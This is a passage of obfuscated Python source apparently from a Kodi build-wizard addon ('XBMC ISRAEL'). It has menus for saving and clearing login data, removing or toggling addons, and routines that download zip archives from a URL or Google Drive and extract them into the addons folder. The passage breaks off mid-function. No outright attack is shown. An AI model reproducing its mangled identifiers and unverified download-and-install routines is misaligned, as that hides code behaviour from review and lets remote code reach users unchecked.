		OOOOOO00O0OO0O0OO =LOGINID [OOOO0O00OOOO0OO0O ]['icon']if os .path .exists (O0OOOOOO000O0O000 )else ICONLOGIN #line:2990
		OOO00OO0O0OO0O000 =LOGINID [OOOO0O00OOOO0OO0O ]['fanart']if os .path .exists (O0OOOOOO000O0O000 )else FANART #line:2991
		O000OO0O0OOO0O00O =createMenu ('saveaddon','Login',OOOO0O00OOOO0OO0O )#line:2992
		O0OO0OOOO0OOO0O00 =createMenu ('save','Login',OOOO0O00OOOO0OO0O )#line:2993
		O000OO0O0OOO0O00O .append ((THEME2 %'%s Settings'%O0OO0OO0O0O00OOOO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,OOOO0O00OOOO0OO0O )))#line:2994
		addFile ('[+]-> %s'%O0OO0OO0O0O00OOOO ,'',icon =OOOOOO00O0OO0O0OO ,fanart =OOO00OO0O0OO0O000 ,themeit =THEME3 )#line:2996
		if not os .path .exists (O0OOOOOO000O0O000 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOOOOO00O0OO0O0OO ,fanart =OOO00OO0O0OO0O000 ,menu =O000OO0O0OOO0O00O )#line:2997
		elif not OOOOO00O0OO000O0O :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',OOOO0O00OOOO0OO0O ,icon =OOOOOO00O0OO0O0OO ,fanart =OOO00OO0O0OO0O000 ,menu =O000OO0O0OOO0O00O )#line:2998
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%OOOOO00O0OO000O0O ,'authlogin',OOOO0O00OOOO0OO0O ,icon =OOOOOO00O0OO0O0OO ,fanart =OOO00OO0O0OO0O000 ,menu =O000OO0O0OOO0O00O )#line:2999
		if OO0O0OOOOOO0O00OO =="":#line:3000
			if os .path .exists (O0O000OO000O0000O ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',OOOO0O00OOOO0OO0O ,icon =OOOOOO00O0OO0O0OO ,fanart =OOO00OO0O0OO0O000 ,menu =O0OO0OOOO0OOO0O00 )#line:3001
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',OOOO0O00OOOO0OO0O ,icon =OOOOOO00O0OO0O0OO ,fanart =OOO00OO0O0OO0O000 ,menu =O0OO0OOOO0OOO0O00 )#line:3002
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO0O0OOOOOO0O00OO ,'',icon =OOOOOO00O0OO0O0OO ,fanart =OOO00OO0O0OO0O000 ,menu =O0OO0OOOO0OOO0O00 )#line:3003
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3005
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3006
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3007
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3008
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3009
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3010
	setView ('files','viewType')#line:3011
def fixUpdate ():#line:3013
	if KODIV <17 :#line:3014
		OO00O0OOO0OOOOOO0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3015
		try :#line:3016
			os .remove (OO00O0OOO0OOOOOO0 )#line:3017
		except Exception as OO00000O0OO00O0OO :#line:3018
			wiz .log ("Unable to remove %s, Purging DB"%OO00O0OOO0OOOOOO0 )#line:3019
			wiz .purgeDb (OO00O0OOO0OOOOOO0 )#line:3020
	else :#line:3021
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3022
def removeAddonMenu ():#line:3024
	O0O0O00OOOO0OO000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3025
	OO0O0O0O000O0OO0O =[];OO0000OO00000OOO0 =[]#line:3026
	for OOOOOO0OOOOOOOO0O in sorted (O0O0O00OOOO0OO000 ,key =lambda O0OO00O00OO00OO0O :O0OO00O00OO00OO0O ):#line:3027
		O000O00OOOO00O000 =os .path .split (OOOOOO0OOOOOOOO0O [:-1 ])[1 ]#line:3028
		if O000O00OOOO00O000 in EXCLUDES :continue #line:3029
		elif O000O00OOOO00O000 in DEFAULTPLUGINS :continue #line:3030
		elif O000O00OOOO00O000 =='packages':continue #line:3031
		OOO00O0OOO0O0O0OO =os .path .join (OOOOOO0OOOOOOOO0O ,'addon.xml')#line:3032
		if os .path .exists (OOO00O0OOO0O0O0OO ):#line:3033
			O0O0OO00O0O00OOO0 =open (OOO00O0OOO0O0O0OO )#line:3034
			OOO000OOO000O0OOO =O0O0OO00O0O00OOO0 .read ()#line:3035
			O0OOO0OOO0O000OOO =wiz .parseDOM (OOO000OOO000O0OOO ,'addon',ret ='id')#line:3036
			OO000OO00OO000O0O =O000O00OOOO00O000 if len (O0OOO0OOO0O000OOO )==0 else O0OOO0OOO0O000OOO [0 ]#line:3038
			try :#line:3039
				OOO0000O000OOOO0O =xbmcaddon .Addon (id =OO000OO00OO000O0O )#line:3040
				OO0O0O0O000O0OO0O .append (OOO0000O000OOOO0O .getAddonInfo ('name'))#line:3041
				OO0000OO00000OOO0 .append (OO000OO00OO000O0O )#line:3042
			except :#line:3043
				pass #line:3044
	if len (OO0O0O0O000O0OO0O )==0 :#line:3045
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3046
		return #line:3047
	if KODIV >16 :#line:3048
		OOO0OO000O0OOOOOO =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,OO0O0O0O000O0OO0O )#line:3049
	else :#line:3050
		OOO0OO000O0OOOOOO =[];OOO0O0OO000O00OO0 =0 #line:3051
		O0OO00O0O000O0O00 =["-- Click here to Continue --"]+OO0O0O0O000O0OO0O #line:3052
		while not OOO0O0OO000O00OO0 ==-1 :#line:3053
			OOO0O0OO000O00OO0 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O0OO00O0O000O0O00 )#line:3054
			if OOO0O0OO000O00OO0 ==-1 :break #line:3055
			elif OOO0O0OO000O00OO0 ==0 :break #line:3056
			else :#line:3057
				O00OO0000O0OOOO0O =(OOO0O0OO000O00OO0 -1 )#line:3058
				if O00OO0000O0OOOO0O in OOO0OO000O0OOOOOO :#line:3059
					OOO0OO000O0OOOOOO .remove (O00OO0000O0OOOO0O )#line:3060
					O0OO00O0O000O0O00 [OOO0O0OO000O00OO0 ]=OO0O0O0O000O0OO0O [O00OO0000O0OOOO0O ]#line:3061
				else :#line:3062
					OOO0OO000O0OOOOOO .append (O00OO0000O0OOOO0O )#line:3063
					O0OO00O0O000O0O00 [OOO0O0OO000O00OO0 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,OO0O0O0O000O0OO0O [O00OO0000O0OOOO0O ])#line:3064
	if OOO0OO000O0OOOOOO ==None :return #line:3065
	if len (OOO0OO000O0OOOOOO )>0 :#line:3066
		wiz .addonUpdates ('set')#line:3067
		for O00O0OOO0O0OOO0OO in OOO0OO000O0OOOOOO :#line:3068
			removeAddon (OO0000OO00000OOO0 [O00O0OOO0O0OOO0OO ],OO0O0O0O000O0OO0O [O00O0OOO0O0OOO0OO ],True )#line:3069
		xbmc .sleep (1000 )#line:3071
		if INSTALLMETHOD ==1 :OO0000O000OOO0OO0 =1 #line:3073
		elif INSTALLMETHOD ==2 :OO0000O000OOO0OO0 =0 #line:3074
		else :OO0000O000OOO0OO0 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3075
		if OO0000O000OOO0OO0 ==1 :wiz .reloadFix ('remove addon')#line:3076
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3077
def removeAddonDataMenu ():#line:3079
	if os .path .exists (ADDOND ):#line:3080
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3081
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3082
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3083
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3084
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3085
		OO0OOO00O0O0000OO =glob .glob (os .path .join (ADDOND ,'*/'))#line:3086
		for OOOO0OOOO0O0OOOOO in sorted (OO0OOO00O0O0000OO ,key =lambda O0OO0OO000OOOO000 :O0OO0OO000OOOO000 ):#line:3087
			O0OOOO0O0O0000O00 =OOOO0OOOO0O0OOOOO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3088
			OO0OOO0O0OO0O00OO =os .path .join (OOOO0OOOO0O0OOOOO .replace (ADDOND ,ADDONS ),'icon.png')#line:3089
			OO00O0O0O0OO0O000 =os .path .join (OOOO0OOOO0O0OOOOO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3090
			O0O00O0OO0000000O =O0OOOO0O0O0000O00 #line:3091
			O00OO00000OOO0000 ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3092
			for OO00OO0OOO000O0O0 in O00OO00000OOO0000 :#line:3093
				O0O00O0OO0000000O =O0O00O0OO0000000O .replace (OO00OO0OOO000O0O0 ,O00OO00000OOO0000 [OO00OO0OOO000O0O0 ])#line:3094
			if O0OOOO0O0O0000O00 in EXCLUDES :O0O00O0OO0000000O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%O0O00O0OO0000000O #line:3095
			else :O0O00O0OO0000000O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%O0O00O0OO0000000O #line:3096
			addFile (' %s'%O0O00O0OO0000000O ,'removedata',O0OOOO0O0O0000O00 ,icon =OO0OOO0O0OO0O00OO ,fanart =OO00O0O0O0OO0O000 ,themeit =THEME2 )#line:3097
	else :#line:3098
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3099
	setView ('files','viewType')#line:3100
def enableAddons ():#line:3102
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3103
	OO0O00O0OOO000000 =glob .glob (os .path .join (ADDONS ,'*/'))#line:3104
	O00O0OO00000O00OO =0 #line:3105
	for O0O0OOO000O000OO0 in sorted (OO0O00O0OOO000000 ,key =lambda OOOOO00OOOOOOO000 :OOOOO00OOOOOOO000 ):#line:3106
		O00OO000O00O0O0OO =os .path .split (O0O0OOO000O000OO0 [:-1 ])[1 ]#line:3107
		if O00OO000O00O0O0OO in EXCLUDES :continue #line:3108
		if O00OO000O00O0O0OO in DEFAULTPLUGINS :continue #line:3109
		O000000OO0000O0OO =os .path .join (O0O0OOO000O000OO0 ,'addon.xml')#line:3110
		if os .path .exists (O000000OO0000O0OO ):#line:3111
			O00O0OO00000O00OO +=1 #line:3112
			OO0O00O0OOO000000 =O0O0OOO000O000OO0 .replace (ADDONS ,'')[1 :-1 ]#line:3113
			O00O000OO0OOOO000 =open (O000000OO0000O0OO )#line:3114
			O0O00OO00OOO00000 =O00O000OO0OOOO000 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3115
			O0O0O000OO00O0OO0 =wiz .parseDOM (O0O00OO00OOO00000 ,'addon',ret ='id')#line:3116
			O0O0OO0OOO00O0OO0 =wiz .parseDOM (O0O00OO00OOO00000 ,'addon',ret ='name')#line:3117
			try :#line:3118
				OO0O0O0O00OOOOO0O =O0O0O000OO00O0OO0 [0 ]#line:3119
				OOO0O0OOO0OO000O0 =O0O0OO0OOO00O0OO0 [0 ]#line:3120
			except :#line:3121
				continue #line:3122
			try :#line:3123
				OO0OO0O000OO00O0O =xbmcaddon .Addon (id =OO0O0O0O00OOOOO0O )#line:3124
				O000000O0OO0OO0O0 ="[COLOR green][Enabled][/COLOR]"#line:3125
				O0O0O0O00OOO00OO0 ="false"#line:3126
			except :#line:3127
				O000000O0OO0OO0O0 ="[COLOR red][Disabled][/COLOR]"#line:3128
				O0O0O0O00OOO00OO0 ="true"#line:3129
				pass #line:3130
			OOOO0OO0OO0OO00O0 =os .path .join (O0O0OOO000O000OO0 ,'icon.png')if os .path .exists (os .path .join (O0O0OOO000O000OO0 ,'icon.png'))else ICON #line:3131
			O00OOOO00000OO00O =os .path .join (O0O0OOO000O000OO0 ,'fanart.jpg')if os .path .exists (os .path .join (O0O0OOO000O000OO0 ,'fanart.jpg'))else FANART #line:3132
			addFile ("%s %s"%(O000000O0OO0OO0O0 ,OOO0O0OOO0OO000O0 ),'toggleaddon',OO0O00O0OOO000000 ,O0O0O0O00OOO00OO0 ,icon =OOOO0OO0OO0OO00O0 ,fanart =O00OOOO00000OO00O )#line:3133
			O00O000OO0OOOO000 .close ()#line:3134
	if O00O0OO00000O00OO ==0 :#line:3135
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3136
	setView ('files','viewType')#line:3137
def changeFeq ():#line:3139
	O0OOOOOOOOOOOOOOO =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3140
	OOOO0OOOOOO00OOO0 =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,O0OOOOOOOOOOOOOOO )#line:3141
	if not OOOO0OOOOOO00OOO0 ==-1 :#line:3142
		wiz .setS ('autocleanfeq',str (OOOO0OOOOOO00OOO0 ))#line:3143
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,O0OOOOOOOOOOOOOOO [OOOO0OOOOOO00OOO0 ]))#line:3144
def developer ():#line:3146
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3147
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3148
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3149
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3150
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3151
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3152
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3153
	setView ('files','viewType')#line:3155
def download (O0O0000O0O000OOOO ,OOO000OOO00O00OOO ):#line:3160
  OOOOO0O0O00O0OOO0 =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3161
  OOO0O00OO00OOOOOO =xbmcgui .DialogProgress ()#line:3162
  OOO0O00OO00OOOOOO .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3163
  OO000OO0000OO000O =os .path .join (OOOOO0O0O00O0OOO0 ,'isr.zip')#line:3164
  O0OOO0OO0O000O000 =urllib2 .Request (O0O0000O0O000OOOO )#line:3165
  O00O0OO000000OO00 =urllib2 .urlopen (O0OOO0OO0O000O000 )#line:3166
  O0O0OO00OOO00O0OO =xbmcgui .DialogProgress ()#line:3168
  O0O0OO00OOO00O0OO .create ("Downloading","Downloading "+name )#line:3169
  O0O0OO00OOO00O0OO .update (0 )#line:3170
  OO000O000OOOO0000 =OOO000OOO00O00OOO #line:3171
  OOO0OO0O00O00OOOO =open (OO000OO0000OO000O ,'wb')#line:3172
  try :#line:3174
    O00000000O0O0OO00 =O00O0OO000000OO00 .info ().getheader ('Content-Length').strip ()#line:3175
    OOO0OOO0O0OOOOOO0 =True #line:3176
  except AttributeError :#line:3177
        OOO0OOO0O0OOOOOO0 =False #line:3178
  if OOO0OOO0O0OOOOOO0 :#line:3180
        O00000000O0O0OO00 =int (O00000000O0O0OO00 )#line:3181
  OOOOO0OO0O00OOO00 =0 #line:3183
  OO0OOOO0O0O00O00O =time .time ()#line:3184
  while True :#line:3185
        OO000O0O0OO0OOO0O =O00O0OO000000OO00 .read (8192 )#line:3186
        if not OO000O0O0OO0OOO0O :#line:3187
            sys .stdout .write ('\n')#line:3188
            break #line:3189
        OOOOO0OO0O00OOO00 +=len (OO000O0O0OO0OOO0O )#line:3191
        OOO0OO0O00O00OOOO .write (OO000O0O0OO0OOO0O )#line:3192
        if not OOO0OOO0O0OOOOOO0 :#line:3194
            O00000000O0O0OO00 =OOOOO0OO0O00OOO00 #line:3195
        if O0O0OO00OOO00O0OO .iscanceled ():#line:3196
           O0O0OO00OOO00O0OO .close ()#line:3197
           try :#line:3198
            os .remove (OO000OO0000OO000O )#line:3199
           except :#line:3200
            pass #line:3201
           break #line:3202
        OOOOO0000O000O0O0 =float (OOOOO0OO0O00OOO00 )/O00000000O0O0OO00 #line:3203
        OOOOO0000O000O0O0 =round (OOOOO0000O000O0O0 *100 ,2 )#line:3204
        O000000OOOOO0OOO0 =OOOOO0OO0O00OOO00 /(1024 *1024 )#line:3205
        O0O0O000O0OO0OO00 =O00000000O0O0OO00 /(1024 *1024 )#line:3206
        OO0O0000OO0OO00OO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',O000000OOOOO0OOO0 ,'teal',O0O0O000O0OO0OO00 )#line:3207
        if (time .time ()-OO0OOOO0O0O00O00O )>0 :#line:3208
          O0OO0OOOOOOOO000O =OOOOO0OO0O00OOO00 /(time .time ()-OO0OOOO0O0O00O00O )#line:3209
          O0OO0OOOOOOOO000O =O0OO0OOOOOOOO000O /1024 #line:3210
        else :#line:3211
         O0OO0OOOOOOOO000O =0 #line:3212
        OOOOOOO0O0000OOOO ='KB'#line:3213
        if O0OO0OOOOOOOO000O >=1024 :#line:3214
           O0OO0OOOOOOOO000O =O0OO0OOOOOOOO000O /1024 #line:3215
           OOOOOOO0O0000OOOO ='MB'#line:3216
        if O0OO0OOOOOOOO000O >0 and not OOOOO0000O000O0O0 ==100 :#line:3217
            O0OOO0O0000OO0O00 =(O00000000O0O0OO00 -OOOOO0OO0O00OOO00 )/O0OO0OOOOOOOO000O #line:3218
        else :#line:3219
            O0OOO0O0000OO0O00 =0 #line:3220
        OO0O0O0O00000OOO0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',O0OO0OOOOOOOO000O ,OOOOOOO0O0000OOOO )#line:3221
        O0O0OO00OOO00O0OO .update (int (OOOOO0000O000O0O0 ),"Downloading "+name ,OO0O0000OO0OO00OO ,OO0O0O0O00000OOO0 )#line:3223
  O0O0OO0OO0O0OOOOO =xbmc .translatePath (os .path .join ('special://home','addons'))#line:3226
  OOO0OO0O00O00OOOO .close ()#line:3228
  extract (OO000OO0000OO000O ,O0O0OO0OO0O0OOOOO ,O0O0OO00OOO00O0OO )#line:3230
  if os .path .exists (O0O0OO0OO0O0OOOOO +'/scakemyer-script.quasar.burst'):#line:3231
    if os .path .exists (O0O0OO0OO0O0OOOOO +'/script.quasar.burst'):#line:3232
     shutil .rmtree (O0O0OO0OO0O0OOOOO +'/script.quasar.burst',ignore_errors =False )#line:3233
    os .rename (O0O0OO0OO0O0OOOOO +'/scakemyer-script.quasar.burst',O0O0OO0OO0O0OOOOO +'/script.quasar.burst')#line:3234
  if os .path .exists (O0O0OO0OO0O0OOOOO +'/plugin.video.kmediatorrent-master'):#line:3236
    if os .path .exists (O0O0OO0OO0O0OOOOO +'/plugin.video.kmediatorrent'):#line:3237
     shutil .rmtree (O0O0OO0OO0O0OOOOO +'/plugin.video.kmediatorrent',ignore_errors =False )#line:3238
    os .rename (O0O0OO0OO0O0OOOOO +'/plugin.video.kmediatorrent-master',O0O0OO0OO0O0OOOOO +'/plugin.video.kmediatorrent')#line:3239
  xbmc .executebuiltin ('UpdateLocalAddons ')#line:3240
  xbmc .executebuiltin ("UpdateAddonRepos")#line:3241
  try :#line:3242
    os .remove (OO000OO0000OO000O )#line:3243
  except :#line:3244
    pass #line:3245
  O0O0OO00OOO00O0OO .close ()#line:3246
def dis_or_enable_addon (O0O00OO0OOOOO0OO0 ,O0O0O000O0O0OO000 ,enable ="true"):#line:3247
    import json #line:3248
    OOOO00O0O0O0OOOO0 ='"%s"'%O0O00OO0OOOOO0OO0 #line:3249
    if xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O00OO0OOOOO0OO0 )and enable =="true":#line:3250
        logging .warning ('already Enabled')#line:3251
        return xbmc .log ("### Skipped %s, reason = allready enabled"%O0O00OO0OOOOO0OO0 )#line:3252
    elif not xbmc .getCondVisibility ("System.HasAddon(%s)"%O0O00OO0OOOOO0OO0 )and enable =="false":#line:3253
        return xbmc .log ("### Skipped %s, reason = not installed"%O0O00OO0OOOOO0OO0 )#line:3254
    else :#line:3255
        O0O0O0O0000O0O0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":%s,"enabled":%s}}'%(OOOO00O0O0O0OOOO0 ,enable )#line:3256
        O0O00O0O00OO00000 =xbmc .executeJSONRPC (O0O0O0O0000O0O0O0 )#line:3257
        OOO0O0OO0O00O0000 =json .loads (O0O00O0O00OO00000 )#line:3258
        if enable =="true":#line:3259
            xbmc .log ("### Enabled %s, response = %s"%(O0O00OO0OOOOO0OO0 ,OOO0O0OO0O00O0000 ))#line:3260
        else :#line:3261
            xbmc .log ("### Disabled %s, response = %s"%(O0O00OO0OOOOO0OO0 ,OOO0O0OO0O00O0000 ))#line:3262
    if O0O0O000O0O0OO000 =='auto':#line:3263
     return True #line:3264
    return xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:3265
def chunk_report (O00O0000O0O00OOOO ,O0O0O00OOOO00O00O ,OO0OOOO0O0O000000 ):#line:3266
   OOOO00OOOOOOO00O0 =float (O00O0000O0O00OOOO )/OO0OOOO0O0O000000 #line:3267
   OOOO00OOOOOOO00O0 =round (OOOO00OOOOOOO00O0 *100 ,2 )#line:3268
   if O00O0000O0O00OOOO >=OO0OOOO0O0O000000 :#line:3270
      sys .stdout .write ('\n')#line:3271
def chunk_read (OO0O0O0OOO00OOO00 ,chunk_size =8192 ,report_hook =None ,dp =None ,destination ='',filesize =1000000 ):#line:3273
   import time #line:3274
   OO00O00OOOOOO00OO =int (filesize )*1000000 #line:3275
   OO00OO0OO0000000O =0 #line:3277
   O00000O00OOO0OO00 =time .time ()#line:3278
   OO0OO000OO00O0000 =0 #line:3279
   logging .warning ('Downloading')#line:3281
   with open (destination ,"wb")as OO000O00OOO00OOOO :#line:3282
    while 1 :#line:3283
      O0OOO00000O00OOO0 =time .time ()-O00000O00OOO0OO00 #line:3284
      OOO0OO00O0OOO0OOO =int (OO0OO000OO00O0000 *chunk_size )#line:3285
      OOO000000OO00OOO0 =OO0O0O0OOO00OOO00 .read (chunk_size )#line:3286
      OO000O00OOO00OOOO .write (OOO000000OO00OOO0 )#line:3287
      OO000O00OOO00OOOO .flush ()#line:3288
      OO00OO0OO0000000O +=len (OOO000000OO00OOO0 )#line:3289
      OO0O0OO0OO000000O =float (OO00OO0OO0000000O )/OO00O00OOOOOO00OO #line:3290
      OO0O0OO0OO000000O =round (OO0O0OO0OO000000O *100 ,2 )#line:3291
      if int (O0OOO00000O00OOO0 )>0 :#line:3292
        OO00O0OOO0OO000OO =int (OOO0OO00O0OOO0OOO /(1024 *O0OOO00000O00OOO0 ))#line:3293
      else :#line:3294
         OO00O0OOO0OO000OO =0 #line:3295
      if OO00O0OOO0OO000OO >1024 and not OO0O0OO0OO000000O ==100 :#line:3296
          OO0O0O0OO0O00O0O0 =int (((OO00O00OOOOOO00OO -OOO0OO00O0OOO0OOO )/1024 )/(OO00O0OOO0OO000OO ))#line:3297
      else :#line:3298
          OO0O0O0OO0O00O0O0 =0 #line:3299
      if OO0O0O0OO0O00O0O0 <0 :#line:3300
        OO0O0O0OO0O00O0O0 =0 #line:3301
      dp .update (int (OO0O0OO0OO000000O ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO0O0OO0OO000000O ,OOO0OO00O0OOO0OOO /(1024 *1024 ),OO00O00OOOOOO00OO /(1000 *1000 ),OO00O0OOO0OO000OO ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (OO0O0O0OO0O00O0O0 ,60 ))#line:3302
      if dp .iscanceled ():#line:3303
         dp .close ()#line:3304
         break #line:3305
      if not OOO000000OO00OOO0 :#line:3306
         break #line:3307
      if report_hook :#line:3309
         report_hook (OO00OO0OO0000000O ,chunk_size ,OO00O00OOOOOO00OO )#line:3310
      OO0OO000OO00O0000 +=1 #line:3311
   logging .warning ('END Downloading')#line:3312
   return OO00OO0OO0000000O #line:3313
def googledrive_download (O0O00O000OOO00000 ,OO0OOOO0OO0OOO000 ,O00O0OOOO0OO00000 ,O000O0000000O000O ):#line:3315
    OO0OOOO000OO00O00 =[]#line:3319
    O00O0O000OOOO0OOO =O0O00O000OOO00000 .split ('=')#line:3320
    O0O00O000OOO00000 =O00O0O000OOOO0OOO [len (O00O0O000OOOO0OOO )-1 ]#line:3321
    def O000O0O0O00O00OOO (OO0000OO0OOOO00OO ):#line:3323
        for O00OO0O00O0O00O0O in OO0000OO0OOOO00OO :#line:3325
            logging .warning ('cookie.name')#line:3326
            logging .warning (O00OO0O00O0O00O0O .name )#line:3327
            OO0O000O0O0O0OO00 =O00OO0O00O0O00O0O .value #line:3328
            if 'download_warning'in O00OO0O00O0O00O0O .name :#line:3329
                logging .warning (O00OO0O00O0O00O0O .value )#line:3330
                logging .warning ('cookie.value')#line:3331
                return O00OO0O00O0O00O0O .value #line:3332
            return OO0O000O0O0O0OO00 #line:3333
        return None #line:3335
    def O00O0O00OO0O00OOO (O00OO0OO0000OO000 ,O00OOOOOOO000OOO0 ):#line:3337
        OOOO00OOO000OOOOO =32768 #line:3339
        O000OO0OOO000OO0O =time .time ()#line:3340
        with open (O00OOOOOOO000OOO0 ,"wb")as OO0000OOOO00O00O0 :#line:3342
            OOO00OOO0OOO0OOO0 =1 #line:3343
            O0O00O0O000OOOOOO =32768 #line:3344
            try :#line:3345
                OOO00O0000OOOO000 =int (O00OO0OO0000OO000 .headers .get ('content-length'))#line:3346
                print ('file total size :',OOO00O0000OOOO000 )#line:3347
            except TypeError :#line:3348
                print ('using dummy length !!!')#line:3349
                OOO00O0000OOOO000 =int (O000O0000000O000O )*1000000 #line:3350
            for OO0OOOO0O000O00O0 in O00OO0OO0000OO000 .iter_content (OOOO00OOO000OOOOO ):#line:3351
                if OO0OOOO0O000O00O0 :#line:3352
                    OO0000OOOO00O00O0 .write (OO0OOOO0O000O00O0 )#line:3353
                    OO0000OOOO00O00O0 .flush ()#line:3354
                    O0OO000O000O0000O =time .time ()-O000OO0OOO000OO0O #line:3355
                    OOOOO0OOO00OO0OO0 =int (OOO00OOO0OOO0OOO0 *O0O00O0O000OOOOOO )#line:3356
                    if O0OO000O000O0000O ==0 :#line:3357
                        O0OO000O000O0000O =0.1 #line:3358
                    O000O000O0O000O00 =int (OOOOO0OOO00OO0OO0 /(1024 *O0OO000O000O0000O ))#line:3359
                    OO000O00000O0OO00 =int (OOO00OOO0OOO0OOO0 *O0O00O0O000OOOOOO *100 /OOO00O0000OOOO000 )#line:3360
                    if O000O000O0O000O00 >1024 and not OO000O00000O0OO00 ==100 :#line:3361
                      O000OOO00OO0OOO0O =int (((OOO00O0000OOOO000 -OOOOO0OOO00OO0OO0 )/1024 )/(O000O000O0O000O00 ))#line:3362
                    else :#line:3363
                      O000OOO00OO0OOO0O =0 #line:3364
                    O00O0OOOO0OO00000 .update (int (OO000O00000O0OO00 ),name ,"\r%d%%,[COLOR aqua] %d MB / %d MB [/COLOR], %d KB/s "%(OO000O00000O0OO00 ,OOOOO0OOO00OO0OO0 /(1024 *1024 ),OOO00O0000OOOO000 /(1000 *1000 ),O000O000O0O000O00 ),'[B]ETA:[/B] [COLOR aqua]%02d:%02d[/COLOR]'%divmod (O000OOO00OO0OOO0O ,60 ))#line:3366
                    OOO00OOO0OOO0OOO0 +=1 #line:3367
                    if O00O0OOOO0OO00000 .iscanceled ():#line:3368
                     O00O0OOOO0OO00000 .close ()#line:3369
                     break #line:3370
    OO00000000OOOO0OO ="https://docs.google.com/uc?export=download"#line:3371
    import urllib2 #line:3376
    import cookielib #line:3377
    from cookielib import CookieJar #line:3379
    O00O0OOO00OOO0O00 =CookieJar ()#line:3381
    O0OOOOO0OO00O0O00 =urllib2 .build_opener (urllib2 .HTTPCookieProcessor (O00O0OOO00OOO0O00 ))#line:3382
    OO0OOO000O0OO00OO ={'id':O0O00O000OOO00000 }#line:3384
    O00O0OOO0000O0O0O =urllib .urlencode (OO0OOO000O0OO00OO )#line:3385
